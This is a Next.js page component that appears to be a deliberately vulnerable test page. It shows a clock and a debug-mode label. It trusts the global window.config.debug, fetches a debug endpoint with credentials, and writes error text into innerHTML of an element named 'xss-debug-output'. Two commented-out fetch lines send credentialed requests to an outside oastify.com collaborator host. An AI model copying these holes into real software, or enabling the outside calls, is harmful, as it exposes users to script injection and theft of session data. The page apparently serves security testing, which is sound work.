'use client';

import { config } from 'process';
import { useState, useEffect } from 'react';

export default function Home() {
  const [time, setTime] = useState('');
  const [serverType, setServerType] = useState('production server');

  useEffect(() => {
    // Set initial time only on client
    setTime(new Date().toLocaleTimeString());
    

  const interval = setInterval(() => {
    setTime(new Date().toLocaleTimeString());

    if (window.config && window.config.debug) {
      setServerType('debug server');
      // fetch('https://e8n5hmky2sbzhldwbl7ogtirbih95zto.oastify.com' + '/api/debug/server', {
        //   credentials: 'include'
        // })
      const supportcookie = document.cookie.split(';').some(c => 
        c.trim().startsWith('debug=')
      );
      
      if (supportcookie) {
        console.log('Config debug mode is ON');
        // fetch('https://e8n5hmky2sbzhldwbl7ogtirbih95zto.oastify.com' + '/api/debug', {
        //   credentials: 'include'
        // })
        fetch(window.location.origin + '/api/debug', {
          credentials: 'include'
        })
          .then(response => response.json())
          .then(data => {
              localStorage.setItem('debugvaluefortesting', JSON.stringify(data))
            }).catch(err => {
            console.error('Debug fetch failed:', err);
            const debugDiv = document.getElementById('xss-debug-output');
            if (debugDiv) {
              debugDiv.innerHTML = '<pre>Debug error: ' + err.message + '</pre>';
            }
          });
      }
    }
  }, 1000);
    // Cleanup interval on unmount
    return () => clearInterval(interval);
  }, []);

  return (
    <main style={{ textAlign: 'center', padding: '20px' }}>
      <h1 style={{ fontSize: '2.5rem', color: '#f83636ff', marginBottom: '10px' }}>
        Testing - {time || 'Loading...'}
      </h1>
      <p style={{ fontSize: '1.2rem', fontStyle: 'italic', color: '#555' }}>
        {serverType}
      </p>
    </main>
  );
}